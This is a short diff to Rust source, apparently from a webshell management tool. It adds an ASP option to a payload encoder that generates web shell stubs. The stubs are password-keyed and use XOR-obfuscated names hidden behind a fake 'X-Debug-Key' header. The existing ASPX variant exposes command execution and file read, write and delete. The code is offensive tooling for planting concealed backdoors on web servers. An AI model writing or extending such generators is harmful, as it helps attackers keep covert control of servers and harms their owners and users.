@@ -15,6 +15,7 @@ use base64::Engine;
 use cbc::cipher::{BlockDecryptMut, BlockEncryptMut, KeyIvInit, block_padding::Pkcs7};
 use md5::{Digest, Md5};
 
+use crate::asp_stub::asp_stub;
 use crate::jsp_stub::{aspx_stub, jsp_stub};
 use crate::protocol::ProtocolError;
 
@@ -1954,6 +1955,17 @@ impl PayloadEncoder for NativeEncoder {
                     n.to_string()
                 };
                 Ok(aspx_stub(&xk, &xor_hex("HTTP_X_DEBUG_KEY", &xk), &xor_hex(token, &xk), &xor_hex(&key_hex, &xk), &h("probe"), &h("exec"), &h("list"), &h("read"), &h("write"), &h("delete"), &h("rename"), &h("mkdir")))
+            }
+            "asp" => {
+                let xk = php_ident();
+                let key_hex = md5_hex(password);
+                let token = &key_hex[..16];
+                Ok(asp_stub(
+                    &xk,
+                    &xor_hex("HTTP_X_DEBUG_KEY", &xk),
+                    &xor_hex(token, &xk),
+                    &xor_hex(&key_hex, &xk),
+                ))
             }
             other => Err(ProtocolError::NotSupported(format!(
                 "NATIVE 编码器暂仅支持 PHP（{other} 待实现）"
